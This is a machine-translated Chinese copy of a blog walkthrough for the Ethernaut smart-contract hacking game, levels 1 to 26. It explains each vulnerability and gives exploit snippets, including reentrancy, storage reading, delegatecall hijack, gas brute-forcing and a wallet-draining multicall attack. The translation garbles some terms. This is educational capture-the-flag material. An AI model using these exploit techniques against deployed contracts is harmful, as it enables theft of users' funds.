# OpenZeppelin 以太网解决方案

> 原文：<https://medium.com/coinmonks/openzeppelin-ethernaut-solutions-ebda8b073b6f?source=collection_archive---------39----------------------->

![](img/ffde25add963533f96e9a5551e32f02d.png)

Image by [@thenikyv](http://twitter.com/thenikyv) from [Unsplash](https://unsplash.com/photos/QkSN_8XcXwQ)

以太之旅是一款在以太坊虚拟机上玩的 Web3/Solidity 游戏。每一层都是需要‘黑’的智能合约。这是学习智能合约的可靠性和基本安全性的好方法。本文将提供我用来解决这些挑战的解决方案、资源和参考资料。本文中引用的所有解决方案代码都可以在 github 库上获得。

> 不知道什么时候买卖，试试[复制交易](http://coincodecap.com/go/bityard)。

## **#1 回退方案**

回退具有在`constructor`中初始化`owner`状态，以及具有 1000 ETH 值的当前`owner`的`contributions`映射。

目标是将`owner`设置到我们的地址，并使用`withdraw`函数耗尽合同余额。

问题:1。要使用可用功能`contribute`改变所有者，我们必须发送 1000 ETH，太多了。2.`withdraw`函数有`onlyOwner`修饰符。

漏洞:定义了`receive`函数，包含我们可以在不发送 1000 ETH 的情况下声明`owner`的条件

解决方案:

1.  `receive`函数要求我们有`contribution` > 0，所以我们调用`msg.value`很低但大于 0 的`contribute`函数。

```
contract.contribute({value: 100000000000000})
```

2.`receive`通过 native call/send 向合同发送 ETH 时触发的函数。我们已经完成了`contribution` > 0 的检查，只需要直接发送 ETH 到带有`msg.value` > 0 的契约。

```
contract.sendTransaction({value: 10000000000000})
```

3.然后你可以查一下，`owner`应该已经改成你的地址了

```
await contract.owner()
```

4.最后，通过调用`withdraw`函数清空合同:

```
contract.withdraw()
```

**#2 落尘溶液**

1.  这是一个棘手的问题，你可能会从编译器版本中怀疑，它使用旧的`^0.6.0`并且仍然接受契约名作为构造函数。但是，应该是构造函数的函数被拼错为`Fal1out`，用 1 代替 l。因此，将该函数作为公共函数，任何人都可以声明该契约的所有权。

```
contract.Fal1out()
```

**#3 硬币翻转解决方案**

1.  CoinFlip 契约要求您通过输入`false`或`true`来猜测`flip`函数的输出。然后`flip`函数使用`block.number-1`计算`blockhash`并将其用作 PRNG 的源。
2.  目标是我们需要以某种方式连续猜测`flip`输出 10 次来通过这个问题，通过公共状态中的`consecutiveWins`值来跟踪。
3.  解决方案:`block.number`对所有事务都可用，并且可以通过在另一个`contract`函数上调用`flip`函数来滥用，在这种情况下`CoinFlipper`契约具有使用`block.number`重构 PRNG 并使用值调用`flip`的`flipper`函数。手动或使用脚本调用 10 次，但问题是我们每次都必须在有差异的事务上调用它，所以在调用另一个调用之前要等待上一个`flipper`完成。

**#4 电话解决**

1.  `tx.origin`不等于`msg.sender`当我们从另一个契约 a 调用契约 B 函数时，因为`tx.origin`将是 EOA 调用者而`msg.sender`将是契约 a 的地址
2.  解决方案可在`Telecall.sol`获得

**#5 令牌解决方案**

1.  旧的 solidity 编译器没有内置的 SafeMath 检查器。因此容易发生下溢和上溢。

```
require(balances[msg.sender] - _value >= 0)
```

对`balances`状态的检查很容易被滥用，因为如果`_value`较高，结果会下溢，结果会变成非常高的单位数。

2.要滥用这个合同，你可以发任何比你现在的`balances`高的`_value`，发到其他任何地址。

**#6 委托解决方案**

1.  `delegatecall`是使用当前合同上下文执行目标合同逻辑的低级函数调用。通过向`msg.data`提供“pwn()”的 keccak 散列的前 4 个字节，函数选择器。我们可以调用该函数，使用`Delegate`契约逻辑修改`owner`，但是使用`Delegation`上下文，从而修改`Delegation`的`owner`。

```
// "0xdd365b8b" is the first 4 bytes of keccak256 hash of "pwn()"
contract.sendTransaction({data:"0xdd365b8b"})
```

**#7 力解**

1.  没有实现`receive()`函数或其中一个函数中没有任何`payable`的契约不能接收任何 ETH，除非从另一个契约中使用`selfdestruct`并将目标契约`payable`地址作为参数。
2.  有几种方法可以做到这一点，`ForceAttack.sol`是我对这个问题的解决方案。

**#8 金库解决方案**

1.  `private`类型不代表你的状态别人看不出来。任何人都可以通过查看合同中的存储数据位置来读取您的数据。
2.  使用任何库，例如`web3`并调用`web3.eth.getStorageAt(<contract address>, <location index>)`，其中位置索引可以通过查看契约中的状态定义顺序来计算，索引指向存储槽，其中每个槽的大小为 32 字节，其中像`boolean`一样共有< 32 字节的数据可以放入 1 个槽中。
3.  这将返回十六进制格式的数据，因为 32 个字节占据 1 个完整的槽，并且在`bool`之后定义，它将占据下一个槽，在这种情况下是在索引 1 处。
4.  密码是“一个非常强的秘密密码:)”

**#9 王者解决**

1.  `King.sol`容易受到拒绝服务攻击，因为使用`payable(king).transfer(msg.value);`行并要求前面的`king`接收 ETH 否则它不会被改变。
2.  通过使用不具有`receive`功能的合同攻击合同，`King.sol`将停止运行。为了减轻这种情况，总是优先选择拉式方法，而不是推式方法。

**#10 重入解决方案**

1.  由于滥用`receive`和`fallback`函数发生重入，重新进入函数调用，直到耗尽所有资金。
2.  `ReentrancyAttack.sol`中提供的解决方案

**#11 电梯解决方案**

1.  在`Elevator.sol`中定义了`Building`接口，并使用该接口的外部实现在执行某些逻辑之前进行检查。这使得`Elevator.sol`易受攻击，因为任何人都可以为`Building`实现提供恶意逻辑。
2.  `Building.sol`实现恶意检查，绕过第一次检查，在第二次检查时改变值。

**#12 隐私解决方案**

1.  类型并不意味着你的状态不能被其他人阅读。任何人都可以通过查看合同中的存储数据位置来读取您的数据。
2.  使用任何库，例如`web3`并调用`web3.eth.getStorageAt(<contract address>, <location index>)`，其中位置索引可以通过查看契约中的状态定义顺序来计算，索引指向存储槽，其中每个槽的大小为 32 字节，其中像`boolean`和`uint8`这样总共有< 32 字节的数据可以放入 1 个槽中。
3.  这将返回十六进制格式的数据，因为 32 个字节占用 1 个完整的槽，连续地在槽 1 用`bool public locked`填充存储器，在槽 2 用`uint256 public ID`填充存储器，在槽 3 用`uint8 private denomination`和`uint16 private awkwardness`填充存储器，在槽 4-5-6 用`bytes32[3] private data`填充存储器。和索引 5 处的槽 6 处的`data[2]`。
4.  `await web3.eth.getStorageAt("0xd533a94194d7DcdD6fAa5b426e97d701ec5A7Ea7", 5)`将返回`bytes32`
5.  当你把它转换成 16 个字节时，solidity 会从右边去掉 16 个字节(或者 32 个十六进制数字)。当 bytesX 转换为 bytesY 时，其中 y < x then x is truncated from the right hand side till the length in bytes is equal to y.
6.  resulting 【 【 is "0x48f9eabfc45106012bae40ff2c23104f" in this case.

**#13 GateKeeperOne 解**

1.  我们需要传递三个修饰符，让我们逐一检查
2.  第一个修饰符相对简单，因为我们以前遇到过，我们必须通过契约调用这个函数，所以`msg.sender`和`tx.origin`会有所不同:

```
modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```

3.第二个修饰符，这个比较棘手，要通过 Gate 2 的`require(msg.gas % 8191 == 0)`，你必须确保你的剩余 gas 是 8191 的整数倍，在调用栈中执行`msg.gas % 8191`的特定时刻。在这种情况下，您可以手动计算(需要时间)或只是蛮力，直到您通过计算。

```
for (uint256 i = 0; i <= 8191; i++) {
            try gate.enter{gas: 800000 + i}(_key) {
                // console.log("passed with gas ->", 800000 + i);
                break;
            } catch {}
        }
```

4.第三个修饰语，我们需要理解数据转换和字节屏蔽是如何对可靠性起作用的，我发现这篇文章在这个[链接](/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009)中真的很有帮助。

这意味着整数键在转换成各种字节大小时，需要满足以下属性:

*   0x11111111 == 0x1111，仅当该值被 0x0000FFFF 屏蔽时才有可能
*   0x1111111100001111！= 0x00001111，这只有在使用掩码 0xFFFFFFFF0000FFFF 保留前面的值时才有可能
*   使用 0xFFFFFFFF0000FFFF 掩码计算密钥:

```
bytes8 _key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
```

**# 14 gatekeeperttwo 解决方案**

1.  我们需要传递三个修饰符，让我们逐一检查
2.  第一个修饰符，相对简单，因为我们以前遇到过，我们必须通过契约调用这个函数，所以`msg.sender`和`tx.origin`会有所不同:

```
modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```

3.第二个修饰符，为了通过 Gate 2，我们必须以某种方式通过等于 0 的代码大小检查，但是我们通过一个将导致> 0 的契约来调用它。使契约代码大小为 0 的一种方法是通过`selfdesctruct`，但是在函数中调用它之后不会调用任何一行代码。我们必须调用`constructor`内部的函数，因为在这个初始化阶段，代码大小当前不存在。

```
constructor(address _gateAddress) {
        gateKeeper = GatekeeperTwo(_gateAddress);
        bytes8 _key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gateKeeper.enter(_key);
    }
```

4.第三个修饰符，我们需要理解数据转换和位运算符，为了使值等于`type(uint64).max`，我们需要用`1`值填充每一位。如果两个运算符的值是`1`和`0`或`0`和`1`，则 XOR 按位将等于`1`。我们可以这样做:

```
bytes8 _key = ~bytes8(keccak256(abi.encodePacked(address(this))));
```

`bytes8(keccak256(abi.encodePacked(address(this))))`与其自身异或的按位非结果将导致所有位等于`1`或`type(uint64).max`。

**#15 奈替考因溶液**

1.  乍一看，这个契约似乎阻止你转移任何值，因为`transfer`函数是时间锁定的。但是如果你在 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md 看到 ERC20 规格。有一种方法可以使用`transferFrom`和`approve`功能代表其他人(消费者)转移您的 ERC20 令牌。
2.  首先，您批准其他地址作为最大值的支出者

```
contract.approve("0xD1973282641fb3BAFa7eD2a82E82E3772b558a79","1000000000000000000000000")
```

3.然后，spender 将所有值从`player`地址转移到其他地址。

```
myContract.methods
  .transferFrom(
    "0xcdfB0772A328da9044D5bfD2D51A47230C9873A4",
    "0xD1973282641fb3BAFa7eD2a82E82E3772b558a79",
    "1000000000000000000000000"
  )
  .send();
```

**#16 保存液**

1.  `delegatecall`正在使用当前合同地址执行目标地址的逻辑。从而在使用目标地址的引用时修改当前契约中的存储槽和状态。
2.  `uint storedTime`在位于存储槽 1 的`LibraryContract`处，使用`Preservation`契约中的`delegatecall`不是修改`storedTime`，而是改变`address public timeZone1Library`，因为它也在存储槽 1 处(上下文仍使用调用者契约)。攻击者可以使用修改后的`setTime(uint256)`函数添加恶意合同地址，该函数可以改变`owner`，如`LibraryContractAttack.sol`所示。

**#17 恢复解决方案**

1.  合同地址是确定的，您可以使用以下公式来重新计算地址:

```
address = sha3(rlp_encode(creator_account, creator_account_nonce))[12:]
```

或者你可以直接浏览 ethscan 来搜索目标合同地址。

**#18 魔术数字解决方案**

1.  要解决这个问题，我们必须了解 https://ethereum.org/en/developers/docs/evm/opcodes/中 EVM 的基本操作码:
2.  有 10 个操作码的大小限制，为了解决这个问题，我们创建了两组字节码:

*   初始化字节码:它负责准备契约并返回运行时字节码。
*   运行时字节码:这是契约创建后实际运行的代码。换句话说，这包含了契约的逻辑。

3.运行时字节码，从`runtime.txt`可用的操作码创建:

```
PUSH 0x2A  // push the requested value 42
PUSH 0x80  // location of storage, could be any
MSTORE     // store to memory
PUSH 32   // length of offset
PUSH 0x80   // value stored at slot 0x80 from code above
RETURN
```

然后使用`evm compile runtime.txt`进行编译

4.Init bycode，从`init.txt`可用的操作码创建。这些将负责在内存中加载我们的运行时操作码，并将其返回给 EVM。

要复制代码，我们需要使用 CODECOPY(t，f，s)操作码，它有 3 个参数。

t:代码在内存中的目标偏移量。我们将其保存到 0x00 偏移量。

f:这是目前未知的运行时操作码的当前位置。

s:这是以字节为单位的运行时代码的大小，即 602 a60805260206080 F3–10 字节长。：

```
PUSH 0x0A // the 10 bytes long
PUSH 0x0c // the current position of runtime opcode
PUSH 0x00 // start
CODECOPY
PUSH 0x0A // the 10 bytes length
PUSH 0x00 // value stored start at slot 0
RETURN
```

然后使用`evm compile init.txt`进行编译

5.组合字节码`<initcode>+<runtimecode>`，例如`600a600c600039600a6000f3 + 602a60505260206050f3`到`600a600c600039600a6000f3602a60505260206050f3`

6.使用`create`命令创建合同，脚本在`MagicNumSend.sol`可用。

**#19 AlienCodex 解决方案**

1.  要通过这个挑战，我们必须理解几个概念:

*   布局存储一般从[这个资源](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html)开始。
*   Layout storage for inheritance = >从左到右从所有继承契约开始，最后是实际契约。
*   动态数组的布局存储= >假设在应用存储布局规则后，映射或数组的存储位置最终是一个槽 p。数组数据从`keccak256(p)`开始定位，其布局方式与静态大小的数组数据相同:一个元素接一个元素，如果元素长度不超过 16 个字节，则可能共享存储槽。

2.从这些概念中，我们可以知道从`Ownable`契约继承的`owner`变量位于存储槽 1(索引 0)，与`contact`布尔值共享。

3.这个契约使用旧的编译器版本，不使用 SafeMath 检查，我们可以通过调用`retract`来减少`codex`数组长度，直到它下溢到最大值。

4.我们知道`p`对于`codex`是 1，并且`keccak256(p)`可以被计算，在这种情况下是`80084422859880547211683076133703299733277748156566366325829078699459944778998`，这个存储槽被`codex`用来指向它的第一个索引。

5.每个合同中的存储槽最大为 2 个⁵⁶，我们可以在索引 2^256 - `keccak256(p)` = `35707666377435648211887908874984608119992236509074197713628505308453184860938`处设置`codex`，由于溢出，它将与`owner`指向同一个存储槽。

**#20 否认解决方案**

1.  要拒绝`Denial`契约，我们可以创建一个`DenialAttack`契约作为合作伙伴，其中在`receive`回退中，我们定义了无限循环，导致呼叫总是没油。

```
receive() external payable {
        uint here = 0;
        while (true) {
            // forever in here
            here++;
        }
    }
```

网站注释:

如果在外部调用回复时使用低级别调用继续执行，请确保指定固定的 gas 津贴。比如`call.gas(100000).value()`。

通常应该遵循 checks-effects-interactions 模式来避免重入攻击，但是也有其他情况(比如函数末尾的多个外部调用)会出现这样的问题。

注意:外部通话最多可以使用通话时当前可用气体的 63/64。因此，根据完成一个事务需要多少 gas，足够高 gas 的事务(即，1/64 的 gas 能够完成父调用中剩余的操作码的事务)可以用来减轻这种特定攻击。

**#21 车间解决方案**

1.  `view`函数被限制为只能读取和返回值，但是我们可以滥用`Shop`契约上的`isSold`状态改变，在`isSold`改变之前，我们返回高值，在它改变之后，我们返回低价。

```
function price() external view returns (uint) {
        if (shop.isSold()) {
            return 10;
        } else {
            return 10000;
        }
    }
```

这可能是因为在我们分配新的`price`值之前`isSold`发生了变化。

```
if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
```

**#22 地塞米松溶液**

1.  为了滥用这个指标，我们可以注意到，通过在令牌 1 和令牌 2 之间摇摆交易，可以滥用和操纵`getSwapPrice`,直到其中一个令牌完全耗尽。

```
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

**#23 地塞米松溶液**

1.  `DexTwo`合同不限制可以`swap`的 ERC20 对。所以我们可以创建恶意的 ERC20，发送流动性到`DexTwo`地址，给`allowance`给它。
2.  我们可以用这个恶意的 ERC 20`swap``token1`和`token2`。

**#24 难题钱包解决方案**

1.  为了解决这个挑战，你必须从[这个资源](https://docs.openzeppelin.com/contracts/3.x/api/proxy#UpgradeableProxy)中理解代理契约的概念。
2.  代理契约负责存储和委托调用逻辑或实现契约，代理和实现契约的存储指针必须指向相同的信息。但是您可以看到在`PuzzleProxy`和`PuzzleWallet`中，存储布局引用了不同的内容。

储存在`PuzzleProxy`:

```
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
..
    }
```

在`PuzzleWallet`的存储:

```
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;
    ..
    }
```

3.首先你调用`proposeNewAdmin`，这将改变`PuzzleProxy`的`pendingAdmin`和`PuzzleWallet`的`owner`

4.现在你是`PuzzleWallet`的所有者，可以打电话给`addToWhitelist`，在这里添加你的合同地址或你的 EOA。

5.要更改`PuzzleProxy`的`admin`的所有者，我们必须在`PuzzleWallet`上更改`maxBalance`，但是要调用`setMaxBalance`我们必须以某种方式耗尽合同余额。我们可以通过提供嵌套的`multicall`数组来调用`PuzzleWallet`中的`multicall`来绕过`deposit`检查。这样我们可以只提供`0.001 eth`而记录为`0.002 eth`。

6.通过调用`execute`和`setMaxBalance`清空余额。

```
function attack() external payable {
        //creating encoded function data
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );
//calling multicall with nested data stored above, value set to 0.001 eth
        wallet.multicall{value: msg.value}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        //making sure our exploit worked
    }
```

**#25 摩托车解决方案**

1.  要解决这个问题，您必须了解 UUPS 代理升级模式、eip1967 和可初始化的契约
2.  我们可以看到`Engine`有可初始化的函数，其行为类似于可升级模式的构造函数，但它是从`Motorbike`上下文中调用的(delegatecall 行为)。所以如果能找到`Engine`合同地址，直接调用`initialize`就可以了。
3.  然后我们可以使用实现地址直接调用`upgradeToAndCall`并指向有`selfdestruct`的恶意契约，它将使用`delegatecall`调用并销毁`Engine`契约。

**#26 GoodSamaritan 解决方案**

1.  看看这个关于自定义错误的解释:[https://blog.soliditylang.org/2021/04/21/custom-errors/](https://blog.soliditylang.org/2021/04/21/custom-errors/)

```
*Please be careful when using error data since its origin is not tracked. 
The error data by default bubbles up through the chain of external calls, 
which means that a contract may forward an error not defined in any of 
the contracts it calls directly. Furthermore, any contract can fake any
 error by returning data that matches an error signature, even if the error
 is not defined anywhere.*
```

2.当调用来自`Coin`的`transfer`函数时，我们可以滥用在`requestDonation`函数中的这种自定义错误检查，因为如果`_dest`参数是契约，它会通知回调。

```
function attack() external {
        gs.requestDonation();
    }

function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
```

仅此而已。谢谢！

完整代码解决方案回购:

[](https://github.com/said017/ethereum-learning-notes/tree/main/ethernauts-solutions) [## 以太坊-学习-笔记/以太坊-主要解决方案 said 017/以太坊-学习-笔记

### 此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…

github.com](https://github.com/said017/ethereum-learning-notes/tree/main/ethernauts-solutions) 

> 加入 Coinmonks [电报频道](https://t.me/coincodecap)和 [Youtube 频道](https://www.youtube.com/c/coinmonks/videos)了解加密交易和投资

# 另外，阅读

*   [瓦济里克斯 NFT 评论](https://coincodecap.com/wazirx-nft-review) | [比茨盖普 vs 皮奥克斯](https://coincodecap.com/bitsgap-vs-pionex) | [坦吉姆评论](https://coincodecap.com/tangem-wallet-review)
*   [如何使用 Solidity 在以太坊上创建 DApp？](https://coincodecap.com/create-a-dapp-on-ethereum-using-solidity)
*   [加密交易机器人](/coinmonks/crypto-trading-bot-c2ffce8acb2a) | [OKEx vs 币安](https://coincodecap.com/okex-vs-binance)
*   [币安 vs FTX](https://coincodecap.com/binance-vs-ftx) | [最佳(SOL)索拉纳钱包](https://coincodecap.com/solana-wallets)
*   [如何在 Uniswap 上交换加密？](https://coincodecap.com/swap-crypto-on-uniswap) | [A-Ads 评论](https://coincodecap.com/a-ads-review)